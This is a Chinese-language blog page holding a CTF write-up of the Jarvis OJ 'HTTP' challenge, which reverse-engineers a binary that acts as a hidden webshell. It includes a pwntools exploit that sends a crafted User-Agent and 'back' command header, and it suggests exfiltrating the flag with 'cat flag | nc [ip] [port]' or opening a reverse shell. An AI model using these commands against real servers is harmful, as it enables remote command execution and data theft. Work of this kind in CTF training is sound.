@@ -1,0 +1,97 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="Jarvis OJ - HTTP の Write-Up"><meta name="keywords" content="PWN,Stack"><meta name="author" content="ColdSnap"><meta name="copyright" content="ColdSnap"><title>Jarvis OJ - HTTP の Write-Up | ColdSnap の Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.8.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.8.2"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
+  google_ad_client: 'ca-pub-4826942730187324',
+  enable_page_level_ads: 'true'
+});
+</script><script src="https://v1.hitokoto.cn/?encode=js&amp;charset=utf-8&amp;select=.footer_custom_text" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '6.3.0'
+} </script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ColdSnap の Blog" type="application/atom+xml">
+</head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-1"><span class="toc-number">1.</span> <span class="toc-text">Step 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-2"><span class="toc-number">2.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-3"><span class="toc-number">3.</span> <span class="toc-text">Step 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-4"><span class="toc-number">4.</span> <span class="toc-text">Step 4</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">ColdSnap</div><div class="author-info__description text-center">Welcome to ColdSnap の Blog</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/Coldwave96">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">91</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">41</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">35</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://bodhidharmalu.github.io">Tigerlu</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://ghealer.top">Ghealer</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ColdSnap の Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/Library">Library</a><a class="site-page" href="/Tools">Tools</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title">Jarvis OJ - HTTP の Write-Up</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-09-03</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WriteUPs/">WriteUPs</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/WriteUPs/JarvisOJ/">JarvisOJ</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">1.1k</span><span class="post-meta__separator">|</span><span>阅读时长: 3 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>运行程序和Guess一样也没有回显，猜测也是一个开放端口的操作，checksec一下：</p>
+<p><img src="/img/HTTP/HTTP1.png"></p>
+<span id="more"></span>
+
+<h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>直接进入逆向代码阶段，IDA打开程序，首先是main函数。果然又是一个socket服务器端模型，监听端口为0x70F即1807:</p>
+<p><img src="/img/HTTP/HTTP2.png"></p>
+<p>根据伪代码，这个sub_40137C函数就是处理函数了，看下这个函数：</p>
+<p><img src="/img/HTTP/HTTP3.png"></p>
+<p>又牵扯到一堆函数，一个一个看下，首先是sub_40125D函数：</p>
+<p><img src="/img/HTTP/HTTP4.png"></p>
+<p>结合ASC II码，函数中间最长的if判断应该改写为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span class="number">3</span></span><br><span class="line">    	|| s[v6 - <span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    	|| s[v6 - <span class="number">2</span>] != <span class="string">&#x27;\r&#x27;</span></span><br><span class="line">    	|| s[v6 - <span class="number">3</span>] != <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    	|| s[v6 - <span class="number">4</span>] != <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">	<span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过这个结构我们发现这是将HTTP请求包的Header和Body部分分开进行处理。这里主要是针对Header部分的处理是通过sub_40116C函数：</p>
+<p><img src="/img/HTTP/HTTP5.png"></p>
+<p>“User-Agent:  ”的数据放在v4中由sub_400FAF函数先做个判断，此外Header中需要有个“back: ”的参数，且该参数将由sub_40102F函数处理。先看下这个函数和这个奇怪的“back: ”参数：</p>
+<p><img src="/img/HTTP/HTTP6.png"></p>
+<p>这个函数看起来存在问题，提及到了可以执行shell命令的popen函数，错误回复信息中也提到了“command”的字眼，猜测是个可以导致命令执行的重点函数。</p>
+<p>回头去看下处理“User-Agent:  ”字段的sub_400FAF函数：</p>
+<p><img src="/img/HTTP/HTTP7.png"></p>
+<p>首先是通过sub_400D30函数得到s，然后将s与“User-Agent:  ”提交的数据循环做异或，看下sub_400D30函数：</p>
+<p><img src="/img/HTTP/HTTP8.png"></p>
+<p>sub_400CEA函数：</p>
+<p><img src="/img/HTTP/HTTP9.png"></p>
+<p>sub_400C86函数：</p>
+<p><img src="/img/HTTP/HTTP10.png"></p>
+<p>大体上来说这个函数对数据进行一系列操作，但是并不需要了解细节。因为在sub_400FAF函数中发现sub_400D30函数操作的off_601CF0位置的数据，和我们的输入没有任何关系。所以理论上说sub_400D30函数的结果对于我们来说就是个固定的数值，只需要控制程序执行这个函数，然后直接读取最终数值就可以。</p>
+<p>最后再看下sub_40116C函数中最后提到的sub_4010DF函数：</p>
+<p><img src="/img/HTTP/HTTP11.png"></p>
+<p>这就是个普通的提示函数，没什么重要信息。</p>
+<h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>经过伪代码的分析，发现这个大致类似一个Webshell的方式。我们需要在HTTP的Header中提供User-agent 字段以及 back 字段。其中User-agent 字段的数据类似Webshell的password，与程序中的数据做对比。而back 字段是要执行的命令，程序收到包做了验证之后就会执行提交的命令，然后将命令执行结果在响应包的Body中返回。</p>
+<p>根据上一步的分析，我们需要调试程序找到我们需要的User-agent 字段的数据，通过hopper发现直接在0x400fca位置下个断点就可以：</p>
+<p><img src="/img/HTTP/HTTP12.png"></p>
+<p>根据sub_400d30函数，执行完之后结果会放到RAX寄存器中去：</p>
+<p><img src="/img/HTTP/HTTP13.png"></p>
+<p>gdb attach上去下断点（下在主进程上）：</p>
+<p><img src="/img/HTTP/HTTP14.png"></p>
+<p>然后nc上去会fork一个子进程，输入按要求的payload，触发sub_400D30函数：</p>
+<p><img src="/img/HTTP/HTTP15.png"></p>
+<p>主进程断在我们想要的地方，发现了函数输出完之后，RAX寄存器中的数据：2016CCE</p>
+<p><img src="/img/HTTP/HTTP16.png"></p>
+<p>下面就是EXP脚本的编写了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">1807</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;2016CCRT&#x27;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> key:</span><br><span class="line">	password += <span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ num)</span><br><span class="line">	num += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;password: &quot;</span> + password</span><br><span class="line"></span><br><span class="line">command = <span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;User-Agent: %s\r\n&quot;</span> % (password)</span><br><span class="line">payload += <span class="string">&quot;back: %s\r\n&quot;</span> % (command)</span><br><span class="line">payload += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;payload: &quot;</span> + payload</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>
+
+<p>本地运行通过：</p>
+<p><img src="/img/HTTP/HTTP17.png"></p>
+<p><img src="/img/HTTP/HTTP18.png"></p>
+<h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>但是远程执行时，首先不知道flag文件格式。其次根据本地调试结果来看，回显的内容是在服务端，无法到达客户端，客户端只能通过Content-Length 字段得知了命令执行输出结果的长度。所以有以下几种方法：</p>
+<ul>
+<li><p>通过一台公网服务器监听某个端口, 然后让目标服务器去执行<code>cat flag | nc [ip] [port]</code>命令将<code>cat flag</code>的输出结果发送给公网服务器的指定端口</p>
+</li>
+<li><p>使用<code>awk</code>等字符串处理命令来逐个字符读取flag，然后对这个字符进行判断是不是等于某一个字符，根据判断的结果产生不同的输出我们就可以根据这个输出的不同来判断这个我们猜测的字符是不是正确</p>
+</li>
+<li><p>最暴力的方法，直接反弹shell</p>
+</li>
+</ul>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ColdSnap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://coldwave96.github.io/2020/09/03/HTTP/">https://coldwave96.github.io/2020/09/03/HTTP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://coldwave96.github.io">ColdSnap の Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/Stack/">Stack</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/09/08/61DCTF-fm/"><i class="fa fa-chevron-left">  </i><span>61DCTF fm の Write-Up</span></a></div><div class="next-post pull-right"><a href="/2020/08/31/Guess/"><span>Jarvis OJ - Guess の Write-Up</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+var verify = 'false' == 'true';
+var record_ip = '' == 'true';
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  recordIP:record_ip,
+  appId:'R82KAmOmkqMWNJs72Fx4ub1O-gzGzoHsz',
+  appKey:'Sq4B8VcTqxJ2qCeJLJa3KbKz',
+  placeholder:'Please leave something ^.^',
+  avatar:'mm',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2025 By ColdSnap</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">hitokoto</div><div class="icp"><a><span>Welcome to my world ^.^</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.8.2"></script><script src="/js/fancybox.js?version=1.8.2"></script><script src="/js/sidebar.js?version=1.8.2"></script><script src="/js/copy.js?version=1.8.2"></script><script src="/js/fireworks.js?version=1.8.2"></script><script src="/js/transition.js?version=1.8.2"></script><script src="/js/scroll.js?version=1.8.2"></script><script src="/js/head.js?version=1.8.2"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
